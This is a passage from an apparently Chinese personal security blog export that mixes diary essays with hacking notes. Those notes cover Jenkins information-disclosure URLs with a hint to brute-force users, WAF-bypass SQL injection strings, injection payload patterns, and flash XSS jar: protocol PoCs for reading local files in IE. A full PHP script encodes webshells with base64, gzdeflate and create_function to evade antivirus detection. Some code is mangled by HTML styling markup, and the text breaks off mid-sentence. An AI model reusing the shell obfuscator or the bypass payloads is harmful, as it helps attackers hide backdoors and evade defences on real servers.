&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http://[jenkinsurl]/asynchPeople/ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;List of all builds:&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; &nbsp;http://[jenkinsurl]/view/All/builds &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; &nbsp;(Seems to be fixed in the latest version 1.575)&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;List publilcy available content: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http://[jenkinsurl]/userContent/ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Type of the Operating System:&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http://[jenkinsurl]/computer/&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; b.通过泄漏的用户名爆破得到一些有build job权限的用户，然后执行相关命令]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>Jenkins</tag>
        <tag>安全测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[随笔]]></title>
    <url>%2F2014%2F06%2F09%2F%E9%9A%8F%E7%AC%94%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; 张艺谋的《归来》上映一段时间的，作为原作的《陆犯焉识》也是一部非常让人纠结的小说。看完有一段时间，结局让人有点难以释怀，久久苦等的婉俞，在她的意识中最后还是没有等到陆焉识的归来。 &nbsp; &nbsp; 一直自我暗示这只是小说而已，巧合一切都是巧合，是作者的精心设计。 &nbsp; &nbsp; 最新再看《三体》这部科幻小说，看到第二部《黑暗森林》了，给我的感觉就是作者太有才了。 &nbsp; &nbsp; 从高一开始，准确的说是从室友的一本杂志，还记得看的第一部网络小说是《七界传说》，慢慢的看的多了，网络小说的吸引力也就小了很多，大学开始专业的书籍看的多些。 &nbsp; &nbsp; 读万卷书，行万里路。不能行万里路，只有读万卷书了。 &nbsp; &nbsp; 今天又到了龙泉，毕业季啊，老同学们基本都毕业了，氛围让人有点伤感，还有那么一点不舍。 &nbsp; &nbsp; 其实，在我的心中我的大学只有两年，就是在龙泉2年，肆意的挥霍着青春，胆大妄为的做着自己想做的事，没有压力，也不存在动力，就是想然后就做，现在在龙泉的那点不多的回忆，也快随着毕业季的到来而慢慢消逝，有那么点祭奠逝去的青春的意思，估计以后也不会再回龙泉，感觉自己的大学就那么结束了。 &nbsp; &nbsp; 让我再感受一下我的青春，听着操场上篮球击地的声音，听着田径场上肆意的吼叫，和隔壁不时高歌，我感觉我离他们越来越远了。 &nbsp; &nbsp; 谈不上后悔，只是做了一个让家人满意自己也不抵触的选择而已，世界是公平的。收获一定伴随着付出，收获的越大，当然你要付出的也越多，即使你付出的是青春。 &nbsp; &nbsp; 最后让我再默默的感受一下与我渐行渐远的肆意的青春。]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[流失的日子]]></title>
    <url>%2F2014%2F05%2F14%2F%E6%B5%81%E5%A4%B1%E7%9A%84%E6%97%A5%E5%AD%90%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; 每到非常累的时候就喜欢写下些东西记录这些日子，记录我曾经也在时间上刻下过的痕迹。 &nbsp; &nbsp; 从走上安全这条路到现在，这次是休息的最长的一段时间，有半年时间了，半年时间没怎么更新博客，说明我半年没做事了。在这流失的日子中，干了很多和技术不相关的事，曾一度的想找到最初那种追求技术极致的梦想，没有任何名利的束缚，研究东西，分享东西，得到爱技术的人的认同就是最大的满足。事实上想要回到起点的感觉可能是每个人的奢望，我不是伟人，在现实面前我屈服了，我不喜欢这种感觉，我不喜欢为了别人的利益而有目的的研究一些东西，或是为了别人附加在自己身上的筹码迫使自己研究那些东西。可能我是一个爱自由的人，也是一个没有勇气追求自由的人。 &nbsp; &nbsp; 一年一度的校赛线上赛结束了，看见大一大二的学弟学妹们通宵的研究题目，让我想起了大一大二时候的我，看见他们身上燃烧的热情，让我有点找到了消失的激情。现在各种信息安全类的比赛层出不穷，奖励也越来越丰厚了，做题的目的也越来越功利了，记得以前参加比赛，基本都是为了提高技术，收获的奖励也就是一张奖状，很喜欢当时的感觉，没有别人施加的压力，不是为了名去参加各种比赛，但现在的自己看见比赛就比较抵触了，一听见什么组织要举行比赛了，领导又想我们去参加了，就倍感压力。 &nbsp; &nbsp; 纯自由的技术氛围越来越少了，也很少有人再去深究最原始的黑客精神是什么了，大环境下的压力迫使人们走上不同的路，人都是要吃饭的，时间是不会停下脚步的，什么样的氛围是符合实际情况又能被自己接受的，我不知道。 &nbsp; &nbsp; 把自己一分为二肯能是我现在最好的办法，一个是最初的自己，一个是现在的自己，让他俩永远走在平行线永不交际。]]></content>
      <categories>
        <category>琐碎杂事</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[[记录]关于绕waf的语句]]></title>
    <url>%2F2014%2F05%2F09%2F%E8%AE%B0%E5%BD%95-%E5%85%B3%E4%BA%8E%E7%BB%95waf%E7%9A%84%E8%AF%AD%E5%8F%A5%2F</url>
    <content type="text"><![CDATA[狗：page_id=null%0A/&amp;#42&amp;#42//&amp;#42!50000%55nIOn&amp;#42//&amp;#42yoyu&amp;#42/all/&amp;#42&amp;#42/%0A/&amp;#42!%53eLEct&amp;#42/%0A/&amp;#42nnaa&amp;#42/+1,2,3,4…&nbsp;D：d:$a=’ass’;$b=’ert’;$c=$a.$b;$c(); 改成$a=’bss’;$b=’ert’;$c=$a.$b;$d=preg_replace(’/b/’,’a’,$c);$d();tips:http://drops.wooyun.org/tips/968]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[关于insert|update|delete注入中的tips]]></title>
    <url>%2F2014%2F05%2F09%2F%E5%85%B3%E4%BA%8Einsert-update-delete%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84tips%2F</url>
    <content type="text"><![CDATA[&nbsp;1.当然报错注入是肯定的。 &nbsp;2.updatexml()、extractvalue()、name_const()函数的使用 &nbsp;3.I’ve noticed some variations in our payload. You can inject using these methods too.&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;’ or (payload) or ’&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;’ and (payload) and ’&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;’ or (payload) and ’&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;’ or (payload) and ’=’&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;’&amp;#42 (payload) &amp;#42’&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;’ or (payload) and ’&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;” ? (payload) ? “ 记录下，以便以后翻阅。 &nbsp;]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>delete</tag>
        <tag>insert</tag>
        <tag>sql注入</tag>
        <tag>update</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一个加密脚本，达到一定免杀效果]]></title>
    <url>%2F2014%2F01%2F03%2F%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%AF%86%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%BE%BE%E5%88%B0%E4%B8%80%E5%AE%9A%E5%85%8D%E6%9D%80%E6%95%88%E6%9E%9C%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; &nbsp;在90sec的论坛上有人发了一些，关于过一些waf的脚本shell，然后有人说这些脚本shell有后门，于是看了下他的加密算法，其实很简单，就写了个加密脚本： &lt;?php /&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42 &#42author: L.N. &#42blog : http://lanu.sinaapp.com &#42date : 2014.01.03 &#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42/ $Key = ""; $YourShell = file_get_contents("1.php"); if($YourShell == null){ echo "not find content!"; } $En_Base64 = base64_encode(gzdeflate($YourShell)); $Lm_File = fopen(’lm.php’,"a+"); $Lm_YourShell = Encode($En_Base64,2, &amp;$Key); $Lm_YourShell_Key = $Key; fwrite($Lm_File,"&lt;?php /&#42 code by L.N. http://lanu.sinaapp.com &#42/ "); fwrite($Lm_File,’$co ="’.$Lm_YourShell.’";’." "); $Lm_Str_Replace = Encode(’str_replace’, 2, &amp;$Key); $Lm_Str_Replace_Key = $Key; fwrite($Lm_File,’$sr = str_replace("’.$Lm_Str_Replace_Key.’","","’.$Lm_Str_Replace.’");’." "); $Lm_Base64_Decode = Encode(’base64_decode’,2, &amp;$Key); $Lm_Base64_Decode_Key = $Key; fwrite($Lm_File,’$bd = $sr("’.$Lm_Base64_Decode_Key.’","","’.$Lm_Base64_Decode.’");’." "); $Lm_Gzinflate = Encode(’gzinflate’,2, &amp;$Key); $Lm_Gzinflate_Key = $Key; fwrite($Lm_File,’$ge = $sr("’.$Lm_Gzinflate_Key.’","","’.$Lm_Gzinflate.’");’." "); $Lm_Create_Cunction = Encode(’create_function’,2, &amp;$Key); $Lm_Create_Cunction_Key = $Key; fwrite($Lm_File,’$cc = $sr("’.$Lm_Create_Cunction_Key.’","","’.$Lm_Create_Cunction.’");’." "); fwrite($Lm_File,’$ex = $cc("",$ge($bd($sr("’.$Lm_YourShell_Key.’","",$co))));’." "); fwrite($Lm_File,’$ex();’." "); fwrite($Lm_File,’?&gt;’." "); fclose($Lm_File); function Encode($Str, $Key_Num, &amp;$Key) { do{ $Key = RandString($Key_Num); }while(strpos($Str, $Key) !== false); return InsertString($Str,$Key,$Key_Num); } function RandString($Num) { $Str = ’abcdefghijklmnopqrstuvwxyz’; $Out_Str = ""; for($i=0;$i&lt;$Num;$i++) { $Rand = rand(0,25); $Out_Str .= $Str[$Rand]; } return $Out_Str; } function InsertString($Str, $Key, $Key_Num) { $Str_Len = strlen($Str); if(intval($Str_Len/20) &gt;= 5) { $Str_Rand_Num = 20; } elseif(intval($Str_Len/10) &gt;= 5) { $Str_Rand_Num = 10; } elseif(intval($Str_Len/5) &gt;= 5) { $Str_Rand_Num = 5; } else { $Str_Rand_Num = 2; } $Arr_Str = str_split($Str, $Str_Rand_Num); if($Key_Num &gt; $Str_Rand_Num) { echo "Key_Num is not greater than Str_Rand_Num";exit; } for($i=1;$i&lt;count($Arr_Str);$i++) { $Check_Str = $Arr_Str[$i-1] . $Key . $Arr_Str[$i]; if(strpos($Check_Str,$Key)&lt;strlen($Arr_Str[$i-1])||strpos(strrev($Check_Str),strrev($Key))&lt;strlen($Arr_Str[$i])) { continue; } else { $Arr_Str[$i-1] .= $Key; } } $Out_Str = implode($Arr_Str); return $Out_Str; } ?&gt;]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>php加密脚本</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jar协议在flash xss中的一些技巧]]></title>
    <url>%2F2013%2F10%2F17%2Fjar%E5%8D%8F%E8%AE%AE%E5%9C%A8flash-xss%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; 看国外大牛一文：http://soroush.secproject.com/blog/2013/10/catch-up-on-flash-xss-exploitation-part-2-navigatetourl-and-jar-protocol/ &nbsp; &nbsp; 讲的关于jar协议在flash xss中的妙用，这儿记录下poc，留作以后翻阅： javascript:alert(1) 等同于jar:javascript:alert(1) &nbsp; bypass例子： 1 234567var input:String = root.loaderInfo.parameters.input; `// input variable&lt;/div&gt; &lt;div class=&quot;line number2 index1 alt1&quot; style=&quot;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;&quot;&gt;vardangerousInput:RegExp = /^w&amp;#42script:.&amp;#42/i; // to cover javascript: and vbscript: protocols!`&lt;/div&gt; &lt;div class=&quot;line number3 index2 alt2&quot; style=&quot;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;&quot;&gt;`if(!dangerousInput.test(input))&lt;/div&gt; &lt;div class=&quot;line number4 index3 alt1&quot; style=&quot;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;&quot;&gt;{&lt;/div&gt; &lt;div class=&quot;line number5 index4 alt2&quot; style=&quot;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;&quot;&gt;&nbsp;&nbsp;&nbsp;&nbsp;// Safe to go?!!! --&amp;gt; No! What about &quot;jar:javascript:&quot;?`&lt;/div&gt; &lt;div class=&quot;line number6 index5 alt1&quot; style=&quot;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;&quot;&gt;`&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;navigateToURL(new` `URLRequest(input),“_self”);// redirection&lt;/div&gt; &lt;div class=&quot;line number7 index6 alt2&quot; style=&quot;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;&quot;&gt;}&lt;/div&gt; &lt;/div&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt; &lt;div class=&quot;line number1 index0 alt2&quot; style=&quot;line-height:13.197916984558105px;font-family:Consolas, ’Bitstream Vera Sans Mono’, ’Courier New’, Courier, monospace;color:#555555;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;direction:ltr !important;white-space:pre !important;&quot;&gt;&amp;#42&lt;/div&gt; &lt;div class=&quot;line number2 index1 alt1&quot; style=&quot;line-height:13.197916984558105px;font-family:Consolas, ’Bitstream Vera Sans Mono’, ’Courier New’, Courier, monospace;color:#555555;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;direction:ltr !important;white-space:pre !important;&quot;&gt;&amp;nbsp;&lt;/div&gt; &lt;div class=&quot;line number3 index2 alt2&quot; style=&quot;line-height:13.197916984558105px;font-family:Consolas, ’Bitstream Vera Sans Mono’, ’Courier New’, Courier, monospace;color:#555555;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;direction:ltr !important;white-space:pre !important;&quot;&gt;http://0me.me/demo/xss/flash/link_protocol_test.swf?input=jar:javascript:alert(1);//`&nbsp;&amp;#42 &nbsp; 在ie中使用jar协议bypass本地文件读取限制： Jar protocol ? Opens C drive (note that I use only 1 slash character for the File protocol): 12345&amp;#42&nbsp;http://0me.me/demo/xss/flash/link_protocol_test.swf?input=jar:file:/c:&nbsp;&amp;#42 Jar protocol ? Opens a file in your local C drive: 12345&amp;#42&nbsp;http://0me.me/demo/xss/flash/link_protocol_test.swf?input=jar:file:/c:windowsStarter.xml&nbsp;&amp;#42 Jar protocol ? Opens other restricted protocols in IE ? example 1: 12345&amp;#42&nbsp;http://0me.me/demo/xss/flash/link_protocol_test.swf?input=jar:shell:cookies&nbsp;&amp;#42 Jar protocol ? Opens other restricted protocols in IE ? example 2: 12345&amp;#42&nbsp;http://0me.me/demo/xss/flash/link_protocol_test.swf?input=jar:mk:@MSITStore:C:WindowsHelpmui 409certmgr.CHM::/html/355962c2-4f6b-4cbd-ab00-6e7ee4dddc16.htm&nbsp;&amp;#42 Playing with backslashes without using “jar:” protocol ? Opens C drive: 12345&amp;#42&nbsp;http://0me.me/demo/xss/flash/link_protocol_test.swf?input=\/c:/&nbsp;&amp;#42 http://0me.me/demo/xss/flash/iframe_link_protocol_test.html&nbsp; 然后下面就是作者的总结的一些思路扩展： These are the things we should be able to do by opening the local file system in an IFrame: 1- Running a dangerous browser readable file (such as html, swf, and so on) that contains malicious scripts to steal more data, execute command, or target the internal network. In order to exploit this issue, you need a vulnerable/malicious file with proper extension (IE should be able to open it) in the target’s machine. This can be an existent file or a file that has been downloaded to the target. However, you may need the user’s interaction (see this old issue:&nbsp;http://forums.cnet.com/7726-6132_102-5480227.html). 2- Hijacking the local sensitive files by using drag-and-drop feature. I should say that I was unable to do this in my PoCs. Maybe I should try harder?! 3- Scanning the local resources. 4- Fingerprinting the users based on their files and directories. Let’s have some fun! I want to open your CDRom!I have created a PoC to eject the empty CD/DVD drives in IE (tested in IE10) ? just like old Trojans!!!: http://0me.me/demo/xss/flash/open_cdrom.html I have used another&nbsp;advisory of mine&nbsp;to enumerate the valid Drive letters and I am opening them one by one in an IFrame! &nbsp;]]></content>
      <categories>
        <category>HTML|CSS|JS|xss|xml</category>
      </categories>
      <tags>
        <tag>xss</tag>
        <tag>flash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[读书笔记]]></title>
    <url>%2F2013%2F10%2F05%2F%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[夜已深了]]></title>
    <url>%2F2013%2F09%2F29%2F%E5%A4%9C%E5%B7%B2%E6%B7%B1%E4%BA%86%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; 夜已深了，安静的夜晚，总是让人容易思考，思考自己都不知道思考的问题，总是能不知不觉的得到没有问题的答案。 有点神奇的感觉，有种佛曰的“悟”。 夜晚总能洗净浮躁，安静的心，却留给了梦，实在是浪费。 洗漱完毕，看着眼前的一片漆黑，知道夜已深了。 夜尽天明，又该干什么呢？ 等待入夜？还是看书吧。 完成生活附加的任务，看书吧，等待那一抹漆黑。 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;2013年9月29日 夜 1:15 &nbsp;]]></content>
      <categories>
        <category>琐碎杂事</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[php反序列unserialize的一个小特性]]></title>
    <url>%2F2013%2F09%2F14%2Fphp%E5%8F%8D%E5%BA%8F%E5%88%97unserialize%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B0%8F%E7%89%B9%E6%80%A7%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; &nbsp; 这几天wordpress的那个反序列漏洞比较火，具体漏洞我就不做分析了，看这篇：http://drops.wooyun.org/papers/596，&nbsp; 你也可以去看英文的原文：http://vagosec.org/2013/09/wordpress-php-object-injection/。&nbsp; wp官网打了补丁，我试图去bypass补丁，但让我自以为成功的时候，发现我天真了，并没有成功绕过wp的补丁，但却发现了unserialize的一个小特性，在此和大家分享一下。&nbsp; 1.unserialize()函数相关源码：&nbsp; `if ((YYLIMIT - YYCURSOR) &lt; 7) YYFILL(7);&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yych = &#42YYCURSOR;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;switch (yych) {&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’C’:&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’O’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy13;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’N’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy5;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’R’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy2;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’S’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy10;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’a’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy11;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’b’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy6;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’d’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy8;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’i’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy7;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’o’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy12;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’r’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy4;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’s’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy9;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’}’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy14;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;default:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy16;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}` 上边这段代码是判断序列串的处理方式，如序列串O:4:”test”:1:{s:1:”a”;s:3:”aaa”;},处理这个序列串，先获取字符串第一个字符为O，然后case ’O’:&nbsp;&nbsp;goto yy13&nbsp; `yy13:&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yych = &amp;#42(YYMARKER = ++YYCURSOR);&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (yych == ’:’) goto yy17;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy3;` 从上边代码看出，指针移动一位指向第二个字符，判断字符是否为:，然后 goto yy17&nbsp; `yy17:&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yych = &amp;#42++YYCURSOR;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (yybm[0+yych] &amp; 128) {&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy20;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (yych == ’+’) goto yy19;&nbsp; …….&nbsp; yy19:&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yych = &amp;#42++YYCURSOR;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (yybm[0+yych] &amp; 128) {&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy20;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy18;` 从上边代码看出，指针移动，判断下一位字符，如果字符是数字直接goto yy20，如果是’+’就goto yy19，而yy19中是对下一位字符判断，如果下一位字符是数字goto yy20，不是就goto 